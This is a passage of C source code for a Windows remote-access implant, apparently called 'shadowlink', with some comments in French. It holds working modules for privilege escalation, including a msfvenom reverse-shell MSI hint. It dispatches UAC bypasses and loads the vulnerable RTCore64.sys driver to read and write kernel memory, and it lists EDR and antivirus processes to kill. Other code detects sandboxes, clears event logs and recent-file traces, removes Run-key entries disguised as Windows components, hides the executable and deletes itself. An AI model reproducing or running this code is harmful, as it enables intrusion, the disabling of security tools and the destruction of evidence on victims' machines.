        &servicesReturned, &resumeHandle, NULL)) {
        
        for (DWORD i = 0; i < servicesReturned && offset < result_size - 200; i++) {
            hService = OpenServiceA(hSCManager, services[i].lpServiceName, SERVICE_QUERY_CONFIG);
            if (hService) {
                DWORD configSize;
                QueryServiceConfigA(hService, NULL, 0, &configSize);
                QUERY_SERVICE_CONFIGA *config = (QUERY_SERVICE_CONFIGA*)malloc(configSize);
                
                if (config && QueryServiceConfigA(hService, config, configSize, &configSize)) {
                    // Check if path contains spaces and is not quoted
                    if (config->lpBinaryPathName && 
                        strchr(config->lpBinaryPathName, ' ') != NULL &&
                        config->lpBinaryPathName[0] != '"') {
                        
                        // Check if it's a writable path opportunity
                        char *space = strchr(config->lpBinaryPathName, ' ');
                        if (space) {
                            offset += snprintf(result + offset, result_size - offset,
                                "║ [!] %s\n"
                                "║     Path: %.50s...\n",
                                services[i].lpServiceName,
                                config->lpBinaryPathName);
                            found++;
                        }
                    }
                }
                if (config) free(config);
                CloseServiceHandle(hService);
            }
        }
    }
    
    free(services);
    CloseServiceHandle(hSCManager);
    
    if (found == 0) {
        offset += snprintf(result + offset, result_size - offset,
            "║ [*] No vulnerable services found                         ║\n");
    } else {
        offset += snprintf(result + offset, result_size - offset,
            "╠══════════════════════════════════════════════════════════╣\n"
            "║ [*] Found %d potential targets                           ║\n",
            found);
    }
    
    offset += snprintf(result + offset, result_size - offset,
        "╚══════════════════════════════════════════════════════════╝\n");
    
    return found;
}

// Check for writable directories in PATH
int find_dll_hijack_paths(char *result, size_t result_size) {
    size_t offset = 0;
    char *path = getenv("PATH");
    char pathCopy[8192];
    char *token;
    int found = 0;
    
    offset += snprintf(result + offset, result_size - offset,
        "╔══════════════════════════════════════════════════════════╗\n"
        "║     DLL HIJACKING OPPORTUNITIES (Writable PATH dirs)     ║\n"
        "╠══════════════════════════════════════════════════════════╣\n");
    
    if (!path) {
        offset += snprintf(result + offset, result_size - offset,
            "║ [!] Cannot get PATH                                      ║\n"
            "╚══════════════════════════════════════════════════════════╝\n");
        return -1;
    }
    
    strncpy(pathCopy, path, sizeof(pathCopy) - 1);
    token = strtok(pathCopy, ";");
    
    while (token != NULL && offset < result_size - 200) {
        // Try to create a test file to check write access
        char testPath[MAX_PATH];
        snprintf(testPath, sizeof(testPath), "%s\\test_write_check.tmp", token);
        
        HANDLE hFile = CreateFileA(testPath, GENERIC_WRITE, 0, NULL,
            CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
        
        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            DeleteFileA(testPath);
            
            offset += snprintf(result + offset, result_size - offset,
                "║ [!] WRITABLE: %.50s\n", token);
            found++;
        }
        
        token = strtok(NULL, ";");
    }
    
    if (found == 0) {
        offset += snprintf(result + offset, result_size - offset,
            "║ [*] No writable PATH directories found                   ║\n");
    }
    
    offset += snprintf(result + offset, result_size - offset,
        "╚══════════════════════════════════════════════════════════╝\n");
    
    return found;
}

// Check for AlwaysInstallElevated
int check_always_install_elevated(char *result, size_t result_size) {
    HKEY hKey;
    DWORD value = 0;
    DWORD size = sizeof(DWORD);
    int vulnerable = 0;
    size_t offset = 0;
    
    offset += snprintf(result + offset, result_size - offset,
        "╔══════════════════════════════════════════════════════════╗\n"
        "║     ALWAYSINSTALLELEVATED CHECK                          ║\n"
        "╠══════════════════════════════════════════════════════════╣\n");
    
    // Check HKCU
    if (RegOpenKeyExA(HKEY_CURRENT_USER,
        "Software\\Policies\\Microsoft\\Windows\\Installer",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
            (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
            offset += snprintf(result + offset, result_size - offset,
                "║ [!] HKCU AlwaysInstallElevated = 1 (VULNERABLE!)         ║\n");
            vulnerable++;
        }
        RegCloseKey(hKey);
    }
    
    // Check HKLM
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Policies\\Microsoft\\Windows\\Installer",
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "AlwaysInstallElevated", NULL, NULL,
            (LPBYTE)&value, &size) == ERROR_SUCCESS && value == 1) {
            offset += snprintf(result + offset, result_size - offset,
                "║ [!] HKLM AlwaysInstallElevated = 1 (VULNERABLE!)         ║\n");
            vulnerable++;
        }
        RegCloseKey(hKey);
    }
    
    if (vulnerable == 2) {
        offset += snprintf(result + offset, result_size - offset,
            "╠══════════════════════════════════════════════════════════╣\n"
            "║ [+] EXPLOITABLE! Create malicious MSI to get SYSTEM      ║\n"
            "║     msfvenom -p windows/x64/shell_reverse_tcp ...        ║\n"
            "║     -f msi > malicious.msi                               ║\n");
    } else {
        offset += snprintf(result + offset, result_size - offset,
            "║ [*] Not vulnerable (both keys must be set to 1)          ║\n");
    }
    
    offset += snprintf(result + offset, result_size - offset,
        "╚══════════════════════════════════════════════════════════╝\n");
    
    return vulnerable;
}

// Master privesc enumeration
int privesc_enumerate(char *result, size_t result_size) {
    size_t offset = 0;
    char level[32];
    int admin = is_admin();
    get_integrity_level(level, sizeof(level));
    
    offset += snprintf(result + offset, result_size - offset,
        "╔══════════════════════════════════════════════════════════╗\n"
        "║     PRIVILEGE ESCALATION ENUMERATION                     ║\n"
        "╠══════════════════════════════════════════════════════════╣\n"
        "║ Current Status:                                          ║\n"
        "║   Administrator: %-40s ║\n"
        "║   Integrity:     %-40s ║\n"
        "║   Username:      %-40s ║\n"
        "╠══════════════════════════════════════════════════════════╣\n",
        admin ? "YES" : "NO",
        level,
        getenv("USERNAME") ? getenv("USERNAME") : "Unknown");
    
    if (admin) {
        offset += snprintf(result + offset, result_size - offset,
            "║ [+] Already running as Administrator!                    ║\n"
            "║ [*] Use 'getsystem' for SYSTEM privileges                ║\n"
            "╚══════════════════════════════════════════════════════════╝\n");
        return 0;
    }
    
    offset += snprintf(result + offset, result_size - offset,
        "║ Available UAC Bypasses:                                  ║\n"
        "║   [1] fodhelper    - Works on Win10/11                   ║\n"
        "║   [2] eventvwr     - Works on Win7/8/10                  ║\n"
        "║   [3] computerdef  - Works on Win10/11                   ║\n"
        "╠══════════════════════════════════════════════════════════╣\n"
        "║ Usage: elevate <method>                                  ║\n"
        "║   elevate fodhelper                                      ║\n"
        "║   elevate eventvwr                                       ║\n"
        "║   elevate computerdef                                    ║\n"
        "╠══════════════════════════════════════════════════════════╣\n"
        "║ Other Checks:                                            ║\n"
        "║   privesc services  - Unquoted service paths             ║\n"
        "║   privesc dll       - DLL hijack opportunities           ║\n"
        "║   privesc msi       - AlwaysInstallElevated              ║\n"
        "╚══════════════════════════════════════════════════════════╝\n");
    
    return 1;  // Need elevation
}

// Master command handler for privilege escalation
int privesc_command(const char *args, char *result, size_t result_size) {
    if (args == NULL || strlen(args) == 0 || strcmp(args, "enum") == 0) {
        return privesc_enumerate(result, result_size);
    }
    else if (strcmp(args, "services") == 0) {
        return find_unquoted_service_paths(result, result_size);
    }
    else if (strcmp(args, "dll") == 0) {
        return find_dll_hijack_paths(result, result_size);
    }
    else if (strcmp(args, "msi") == 0) {
        return check_always_install_elevated(result, result_size);
    }
    else {
        snprintf(result, result_size,
            "╔══════════════════════════════════════════════════════════╗\n"
            "║     PRIVILEGE ESCALATION MODULE                          ║\n"
            "╠══════════════════════════════════════════════════════════╣\n"
            "║ Commands:                                                ║\n"
            "║   privesc              - Enumerate all options           ║\n"
            "║   privesc services     - Check unquoted paths            ║\n"
            "║   privesc dll          - Check DLL hijack                ║\n"
            "║   privesc msi          - Check AlwaysInstallElevated     ║\n"
            "║                                                          ║\n"
            "║   elevate fodhelper    - UAC bypass via fodhelper        ║\n"
            "║   elevate eventvwr     - UAC bypass via eventvwr         ║\n"
            "║   elevate computerdef  - UAC bypass via computerdefaults ║\n"
            "╚══════════════════════════════════════════════════════════╝\n");
        return 0;
    }
}

// Elevate command handler
int elevate_command(const char *method, char *result, size_t result_size) {
    if (is_admin()) {
        snprintf(result, result_size,
            "[*] Already running with Administrator privileges!\n"
            "[*] Integrity level: High\n");
        return 0;
    }
    
    if (method == NULL || strlen(method) == 0) {
        snprintf(result, result_size,
            "[!] Usage: elevate <method>\n"
            "    Methods: fodhelper, eventvwr, computerdef\n");
        return -1;
    }
    
    if (strcmp(method, "fodhelper") == 0) {
        return uac_bypass_fodhelper(NULL, result, result_size);
    }
    else if (strcmp(method, "eventvwr") == 0) {
        return uac_bypass_eventvwr(NULL, result, result_size);
    }
    else if (strcmp(method, "computerdef") == 0 || strcmp(method, "computerdefaults") == 0) {
        return uac_bypass_computerdefaults(NULL, result, result_size);
    }
    else {
        snprintf(result, result_size,
            "[!] Unknown method: %s\n"
            "    Available: fodhelper, eventvwr, computerdef\n",
            method);
        return -1;
    }
}


// ============================================
// PHASE 10: BYOVD - BRING YOUR OWN VULNERABLE DRIVER
// ============================================
/*
 * BYOVD exploits legitimate but vulnerable signed drivers to:
 * 1. Gain kernel-level access
 * 2. Kill EDR/AV processes from kernel mode
 * 3. Remove kernel callbacks
 * 
 * Popular vulnerable drivers:
 * - RTCore64.sys (MSI Afterburner) - Arbitrary memory R/W
 * - DBUtil_2_3.sys (Dell) - Arbitrary memory R/W
 * - AsIO64.sys (ASUS) - Arbitrary memory R/W
 * - gdrv.sys (Gigabyte) - Arbitrary memory R/W
 * 
 * This implementation uses RTCore64.sys as example
 */

// RTCore64.sys IOCTL codes
#define RTCORE_DEVICE_TYPE        0x8000
#define RTCORE_READ_MEMORY        0x80002048
#define RTCORE_WRITE_MEMORY       0x8000204C

// Structure for RTCore64 memory operations
typedef struct _RTCORE_MEMORY {
    BYTE Pad0[8];
    DWORD64 Address;
    BYTE Pad1[8];
    DWORD ReadSize;
    DWORD Value;
    BYTE Pad2[16];
} RTCORE_MEMORY, *PRTCORE_MEMORY;

// BYOVD state
static HANDLE g_hVulnDriver = INVALID_HANDLE_VALUE;
static int g_byovd_loaded = 0;

// Embedded RTCore64.sys driver (base64 encoded - placeholder)
// In real scenario, you would embed the actual driver bytes
// The driver is ~15KB and digitally signed by MSI
static const char* RTCORE_DRIVER_NAME = "RTCore64.sys";
static const char* RTCORE_SERVICE_NAME = "RTCore64";
static const char* RTCORE_DEVICE_NAME = "\\\\.\\RTCore64";

// Load vulnerable driver from disk or embedded resource
int byovd_load_driver(const char* driver_path, char *result, size_t result_size) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    char full_path[MAX_PATH];
    DWORD error = 0;
    
    // Get full path if relative
    if (driver_path[1] != ':') {
        GetCurrentDirectoryA(MAX_PATH, full_path);
        strcat(full_path, "\\");
        strcat(full_path, driver_path);
    } else {
        strcpy(full_path, driver_path);
    }
    
    // Check if driver file exists
    if (GetFileAttributesA(full_path) == INVALID_FILE_ATTRIBUTES) {
        snprintf(result, result_size, 
            "[!] Driver not found: %s\n"
            "[*] Download RTCore64.sys from MSI Afterburner\n"
            "[*] Or use: upload RTCore64.sys\n", full_path);
        return -1;
    }
    
    // Open Service Control Manager
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        error = GetLastError();
        if (error == ERROR_ACCESS_DENIED) {
            snprintf(result, result_size, 
                "[!] Access denied - Administrator privileges required!\n");
        } else {
            snprintf(result, result_size, 
                "[!] OpenSCManager failed: %lu\n", error);
        }
        return -2;
    }
    
    // Try to open existing service first
    hService = OpenServiceA(hSCManager, RTCORE_SERVICE_NAME, SERVICE_ALL_ACCESS);
    
    if (!hService) {
        // Create new service
        hService = CreateServiceA(
            hSCManager,
            RTCORE_SERVICE_NAME,           // Service name
            RTCORE_SERVICE_NAME,           // Display name
            SERVICE_ALL_ACCESS,
            SERVICE_KERNEL_DRIVER,         // Kernel driver
            SERVICE_DEMAND_START,          // Manual start
            SERVICE_ERROR_IGNORE,
            full_path,                     // Binary path
            NULL, NULL, NULL, NULL, NULL
        );
        
        if (!hService) {
            error = GetLastError();
            CloseServiceHandle(hSCManager);
            snprintf(result, result_size, 
                "[!] CreateService failed: %lu\n", error);
            return -3;
        }
    }
    
    // Start the service (load driver)
    if (!StartServiceA(hService, 0, NULL)) {
        error = GetLastError();
        if (error != ERROR_SERVICE_ALREADY_RUNNING) {
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCManager);
            snprintf(result, result_size, 
                "[!] StartService failed: %lu\n"
                "[*] Driver may require test signing mode\n", error);
            return -4;
        }
    }
    
    // Open device handle
    g_hVulnDriver = CreateFileA(
        RTCORE_DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    
    if (g_hVulnDriver == INVALID_HANDLE_VALUE) {
        error = GetLastError();
        CloseServiceHandle(hService);
        CloseServiceHandle(hSCManager);
        snprintf(result, result_size, 
            "[!] Cannot open device: %lu\n", error);
        return -5;
    }
    
    g_byovd_loaded = 1;
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    
    snprintf(result, result_size,
        "[+] Vulnerable driver loaded successfully!\n"
        "    Driver: %s\n"
        "    Service: %s\n"
        "    Device: %s\n"
        "    Status: READY\n"
        "[*] Kernel access available\n",
        RTCORE_DRIVER_NAME, RTCORE_SERVICE_NAME, RTCORE_DEVICE_NAME);
    
    return 0;
}

// Read kernel memory using vulnerable driver
DWORD64 byovd_read_memory(DWORD64 address, DWORD size) {
    if (g_hVulnDriver == INVALID_HANDLE_VALUE) return 0;
    
    RTCORE_MEMORY mem = {0};
    mem.Address = address;
    mem.ReadSize = size;
    
    DWORD bytesReturned = 0;
    DeviceIoControl(g_hVulnDriver, RTCORE_READ_MEMORY,
        &mem, sizeof(mem), &mem, sizeof(mem), &bytesReturned, NULL);
    
    return mem.Value;
}

// Write kernel memory using vulnerable driver
int byovd_write_memory(DWORD64 address, DWORD value, DWORD size) {
    if (g_hVulnDriver == INVALID_HANDLE_VALUE) return -1;
    
    RTCORE_MEMORY mem = {0};
    mem.Address = address;
    mem.ReadSize = size;
    mem.Value = value;
    
    DWORD bytesReturned = 0;
    return DeviceIoControl(g_hVulnDriver, RTCORE_WRITE_MEMORY,
        &mem, sizeof(mem), &mem, sizeof(mem), &bytesReturned, NULL) ? 0 : -1;
}

// Find process EPROCESS structure in kernel
// This requires ntoskrnl.exe base address and PsInitialSystemProcess
DWORD64 byovd_find_eprocess(DWORD target_pid) {
    // Simplified - would need to walk EPROCESS list
    // This is advanced and OS-version specific
    return 0;
}

// Kill a process from kernel mode by clearing its token
int byovd_kill_process_kernel(DWORD target_pid, char *result, size_t result_size) {
    if (!g_byovd_loaded) {
        snprintf(result, result_size, "[!] Driver not loaded. Use: byovd load <path>\n");
        return -1;
    }
    
    // In a real implementation, we would:
    // 1. Find EPROCESS of target
    // 2. Modify token or simply set a flag
    // 3. Process terminates from kernel
    
    snprintf(result, result_size,
        "[*] Kernel kill for PID %lu\n"
        "    Status: DEMONSTRATION MODE\n"
        "    Note: Full implementation requires:\n"
        "    - ntoskrnl.exe base resolution\n"
        "    - EPROCESS structure walking\n"
        "    - OS version-specific offsets\n",
        target_pid);
    
    return 0;
}

// List common EDR/AV processes that can be killed
int byovd_list_targets(char *result, size_t result_size) {
    size_t offset = 0;
    
    const char* edr_processes[] = {
        // EDR Products
        "MsMpEng.exe",           // Windows Defender
        "MsSense.exe",           // Microsoft Defender for Endpoint
        "SenseIR.exe",           // Microsoft Defender
        "CylanceSvc.exe",        // Cylance
        "CylanceUI.exe",
        "cb.exe",                // Carbon Black
        "RepMgr.exe",
        "CrowdStrike.exe",       // CrowdStrike Falcon
        "CSFalconService.exe",
        "SentinelAgent.exe",     // SentinelOne
        "SentinelUI.exe",
        "cortex-xdr.exe",        // Palo Alto Cortex
        "Traps.exe",
        "SEPMasterService.exe",  // Symantec
        "ccSvcHst.exe",
        "xagt.exe",              // FireEye
        "TaniumClient.exe",      // Tanium
        "elastic-agent.exe",     // Elastic
        "elastic-endpoint.exe",
        "bdagent.exe",           // Bitdefender
        "avp.exe",               // Kaspersky
        "egui.exe",              // ESET
        "sophoshealth.exe",      // Sophos
        "savservice.exe",
        // AV Products
        "avgnt.exe",             // Avira
        "avast*.exe",            // Avast
        "mcshield.exe",          // McAfee
        "avastsvc.exe"
    };
    
    offset += snprintf(result + offset, result_size - offset,
        "╔══════════════════════════════════════════════════════════╗\n"
        "║         BYOVD EDR/AV TARGETS                             ║\n"
        "╠══════════════════════════════════════════════════════════╣\n");
    
    // Check which are running
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        
        if (Process32First(hSnapshot, &pe32)) {
            do {
                for (int i = 0; i < sizeof(edr_processes)/sizeof(edr_processes[0]); i++) {
                    if (_stricmp(pe32.szExeFile, edr_processes[i]) == 0) {
                        offset += snprintf(result + offset, result_size - offset,
                            "║ [!] %-20s PID: %-10lu RUNNING ║\n",
                            pe32.szExeFile, pe32.th32ProcessID);
                    }
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    offset += snprintf(result + offset, result_size - offset,
        "╠══════════════════════════════════════════════════════════╣\n"
        "║ Use: byovd kill <pid> to terminate from kernel           ║\n"
        "╚══════════════════════════════════════════════════════════╝\n");
    
    return (int)offset;
}

// Unload vulnerable driver
int byovd_unload_driver(char *result, size_t result_size) {
    SC_HANDLE hSCManager = NULL;
    SC_HANDLE hService = NULL;
    SERVICE_STATUS status;
    
    if (g_hVulnDriver != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hVulnDriver);
        g_hVulnDriver = INVALID_HANDLE_VALUE;
    }
    
    hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        snprintf(result, result_size, "[!] Cannot open SCManager\n");
        return -1;
    }
    
    hService = OpenServiceA(hSCManager, RTCORE_SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (hService) {
        ControlService(hService, SERVICE_CONTROL_STOP, &status);
        DeleteService(hService);
        CloseServiceHandle(hService);
    }
    
    CloseServiceHandle(hSCManager);
    g_byovd_loaded = 0;
    
    snprintf(result, result_size,
        "[+] Driver unloaded\n"
        "    Service: %s (stopped and deleted)\n",
        RTCORE_SERVICE_NAME);
    
    return 0;
}

// Master BYOVD command handler
int byovd_command(const char *args, char *result, size_t result_size) {
    if (strncmp(args, "load ", 5) == 0) {
        return byovd_load_driver(args + 5, result, result_size);
    }
    else if (strcmp(args, "unload") == 0) {
        return byovd_unload_driver(result, result_size);
    }
    else if (strcmp(args, "targets") == 0 || strcmp(args, "list") == 0) {
        return byovd_list_targets(result, result_size);
    }
    else if (strncmp(args, "kill ", 5) == 0) {
        DWORD pid = (DWORD)atoi(args + 5);
        return byovd_kill_process_kernel(pid, result, result_size);
    }
    else if (strcmp(args, "status") == 0) {
        snprintf(result, result_size,
            "╔══════════════════════════════════════╗\n"
            "║         BYOVD STATUS                 ║\n"
            "╠══════════════════════════════════════╣\n"
            "║ Driver Loaded: %-21s ║\n"
            "║ Driver Name: %-23s ║\n"
            "║ Device Handle: %-21s ║\n"
            "╚══════════════════════════════════════╝\n",
            g_byovd_loaded ? "YES" : "NO",
            RTCORE_DRIVER_NAME,
            (g_hVulnDriver != INVALID_HANDLE_VALUE) ? "VALID" : "INVALID");
        return 0;
    }
    else {
        snprintf(result, result_size,
            "╔══════════════════════════════════════════════════════════╗\n"
            "║         BYOVD - BRING YOUR OWN VULNERABLE DRIVER         ║\n"
            "╠══════════════════════════════════════════════════════════╣\n"
            "║ Usage:                                                   ║\n"
            "║   byovd load <path>    - Load vulnerable driver          ║\n"
            "║   byovd unload         - Unload driver                   ║\n"
            "║   byovd status         - Check driver status             ║\n"
            "║   byovd targets        - List EDR/AV processes           ║\n"
            "║   byovd kill <pid>     - Kill process from kernel        ║\n"
            "╠══════════════════════════════════════════════════════════╣\n"
            "║ Supported Drivers:                                       ║\n"
            "║   - RTCore64.sys (MSI Afterburner)                       ║\n"
            "║   - DBUtil_2_3.sys (Dell)                                ║\n"
            "║   - gdrv.sys (Gigabyte)                                  ║\n"
            "╠══════════════════════════════════════════════════════════╣\n"
            "║ [!] Requires Administrator privileges                    ║\n"
            "║ [!] May trigger driver load events                       ║\n"
            "╚══════════════════════════════════════════════════════════╝\n");
        return 0;
    }
}


// ============================================
// ADVANCED EVASION - DELAYED EXECUTION
// ============================================

// Détecte une exécution trop rapide (sandbox)
int detect_fast_execution(void) {
    DWORD startTick = GetTickCount();
    
    // Effectuer une opération coûteuse
    volatile int x = 0;
    for (int i = 0; i < 100000; i++) {
        x += i * i;
    }
    
    DWORD elapsed = GetTickCount() - startTick;
    
    // Si ça prend moins de 10ms, c'est probablement accéléré (sandbox)
    return (elapsed < 10);
}

// Exécution différée avec vérification anti-sandbox
int delayed_execution(DWORD delay_ms) {
    if (!stealth_mode) return 0;
    
    DWORD startTick = GetTickCount();
    
    // Attendre le délai spécifié
    Sleep(delay_ms);
    
    DWORD elapsed = GetTickCount() - startTick;
    
    // Si le temps écoulé est significativement différent, c'est suspect
    // Les sandbox accélèrent souvent le temps
    if (elapsed < delay_ms * 0.9) {
        return 1;  // Sandbox détectée
    }
    
    return 0;  // OK
}


// ============================================
// ADVANCED EVASION - SELF-DELETION
// ============================================

// Secure overwrite - write random data over file before deletion
int secure_wipe_file(const char *filepath) {
    HANDLE hFile = CreateFileA(filepath, GENERIC_WRITE, 0, NULL, 
        OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return -1;
    
    // Get file size
    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) {
        CloseHandle(hFile);
        return -2;
    }
    
    // Overwrite with random data (3 passes)
    DWORD chunkSize = 4096;
    unsigned char *randomData = (unsigned char*)malloc(chunkSize);
    if (!randomData) {
        CloseHandle(hFile);
        return -3;
    }
    
    for (int pass = 0; pass < 3; pass++) {
        SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
        LONGLONG remaining = fileSize.QuadPart;
        
        while (remaining > 0) {
            DWORD toWrite = (remaining < chunkSize) ? (DWORD)remaining : chunkSize;
            
            // Fill with different patterns each pass
            for (DWORD i = 0; i < toWrite; i++) {
                if (pass == 0) randomData[i] = 0x00;      // Pass 1: zeros
                else if (pass == 1) randomData[i] = 0xFF; // Pass 2: ones
                else randomData[i] = (unsigned char)(rand() % 256); // Pass 3: random
            }
            
            DWORD written;
            WriteFile(hFile, randomData, toWrite, &written, NULL);
            remaining -= written;
        }
        FlushFileBuffers(hFile);
    }
    
    free(randomData);
    CloseHandle(hFile);
    return 0;
}

// Delete a file with secure wipe
int secure_delete_file(const char *filepath) {
    // Remove read-only attribute if present
    DWORD attrs = GetFileAttributesA(filepath);
    if (attrs != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesA(filepath, FILE_ATTRIBUTE_NORMAL);
    }
    
    // Secure wipe first
    secure_wipe_file(filepath);
    
    // Then delete
    return DeleteFileA(filepath) ? 0 : -1;
}

// Clear Windows Event Logs (requires admin)
void clear_event_logs(void) {
    // Clear Security, System, and Application logs
    const char *logs[] = {"Security", "System", "Application"};
    
    for (int i = 0; i < 3; i++) {
        HANDLE hEventLog = OpenEventLogA(NULL, logs[i]);
        if (hEventLog) {
            ClearEventLogA(hEventLog, NULL);
            CloseEventLog(hEventLog);
        }
    }
}

// Clear recent files and jump lists
void clear_recent_traces(void) {
    char cmd[512];
    
    // Clear recent documents
    execute_command_silent("del /f /q \"%APPDATA%\\Microsoft\\Windows\\Recent\\*.*\"", cmd, sizeof(cmd));
    
    // Clear prefetch (requires admin)
    execute_command_silent("del /f /q \"C:\\Windows\\Prefetch\\*.*\"", cmd, sizeof(cmd));
    
    // Clear temp files
    execute_command_silent("del /f /s /q \"%TEMP%\\*.*\"", cmd, sizeof(cmd));
}

// Delete any copies we made
void delete_installed_copies(void) {
    char path[MAX_PATH];
    char localAppData[MAX_PATH];
    
    // Get LocalAppData path
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, localAppData))) {
        // Common installation locations
        const char *subpaths[] = {
            "\\Microsoft\\WindowsUpdate\\wuauclt.exe",
            "\\Microsoft\\Windows\\RuntimeBroker.exe",
            "\\Temp\\svchost.exe",
            "\\Microsoft\\Windows\\Explorer\\SearchIndexer.exe"
        };
        
        for (int i = 0; i < 4; i++) {
            snprintf(path, MAX_PATH, "%s%s", localAppData, subpaths[i]);
            if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES) {
                SetFileAttributesA(path, FILE_ATTRIBUTE_NORMAL);
                secure_delete_file(path);
            }
        }
    }
    
    // Also check startup folder
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, path))) {
        strcat(path, "\\*.exe");
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(path, &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                char fullPath[MAX_PATH];
                SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, fullPath);
                strcat(fullPath, "\\");
                strcat(fullPath, fd.cFileName);
                secure_delete_file(fullPath);
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }
}

// Remove all registry entries we created
void purge_registry_entries(void) {
    // Remove Run key entries
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, 
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        
        // Try to delete our known entry names
        const char *entries[] = {
            "WindowsSecurityHealth",
            "WindowsUpdate", 
            "RuntimeBroker",
            "SearchIndexer",
            "SecurityHealth"
        };
        
        for (int i = 0; i < 5; i++) {
            RegDeleteValueA(hKey, entries[i]);
        }
        RegCloseKey(hKey);
    }
    
    // Also check HKLM if we have admin rights
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
        0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
        
        const char *entries[] = {"WindowsSecurityHealth", "WindowsUpdate"};
        for (int i = 0; i < 2; i++) {
            RegDeleteValueA(hKey, entries[i]);
        }
        RegCloseKey(hKey);
    }
}

// Complete self-destruction
int self_destruct_complete(void) {
    char exePath[MAX_PATH];
    char cmdLine[MAX_PATH * 3];
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    
    // 1. Get our executable path
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }
    
    // 2. Remove persistence entries
    remove_persistence();
    
    // 3. Purge registry entries
    purge_registry_entries();
    
    // 4. Delete any installed copies
    delete_installed_copies();
    
    // 5. Clear traces (event logs, recent files, prefetch)
    clear_recent_traces();
    clear_event_logs();
    
    // 6. Prepare secure deletion command
    // This will:
    // - Wait for us to exit
    // - Overwrite the file with zeros
    // - Delete the file
    // - Delete itself
    snprintf(cmdLine, sizeof(cmdLine),
        "cmd.exe /c "
        "ping 127.0.0.1 -n 2 > nul & "                    // Wait 2 seconds
        "attrib -h -s \"%s\" & "                           // Remove hidden/system
        "echo. > \"%s\" & "                                // Truncate file
        "del /f /q \"%s\" & "                              // Delete file
        "rd /s /q \"%%TEMP%%\\shadowlink\" 2>nul & "       // Delete temp folder if exists
        "del /f /q \"%%TEMP%%\\*.tmp\" 2>nul",             // Clean temp
        exePath, exePath, exePath);
    
    // 7. Launch deletion process
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    ZeroMemory(&pi, sizeof(pi));
    
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
                        CREATE_NO_WINDOW | CREATE_NEW_PROCESS_GROUP, 
                        NULL, NULL, &si, &pi)) {
        return -1;
    }
    
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return 0;
}

// Legacy function - calls complete version
int self_delete(void) {
    return self_destruct_complete();
}


// ============================================
// ADVANCED EVASION - HIDE FILE
// ============================================

// Cacher le fichier exécutable dans l'explorateur Windows
int hide_executable(void) {
    char exePath[MAX_PATH];
    
    // Obtenir le chemin de l'exécutable
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }
    
    // Définir les attributs: Hidden + System
    // FILE_ATTRIBUTE_HIDDEN = 0x02
    // FILE_ATTRIBUTE_SYSTEM = 0x04
    DWORD attributes = GetFileAttributesA(exePath);
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        return -2;
    }
    
    // Ajouter les attributs cachés et système
    attributes |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
    
    if (!SetFileAttributesA(exePath, attributes)) {
        return -3;
    }
    
    return 0;
}

// Montrer le fichier (retirer les attributs cachés)
int unhide_executable(void) {
    char exePath[MAX_PATH];
    
    if (GetModuleFileNameA(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }
    
    DWORD attributes = GetFileAttributesA(exePath);
    if (attributes == INVALID_FILE_ATTRIBUTES) {
        return -2;
    }
    
    // Retirer les attributs cachés et système
    attributes &= ~(FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    
    if (!SetFileAttributesA(exePath, attributes)) {
        return -3;
    }
    
    return 0;
}

// Copier l'exécutable vers un nouvel emplacement avec un nouveau nom
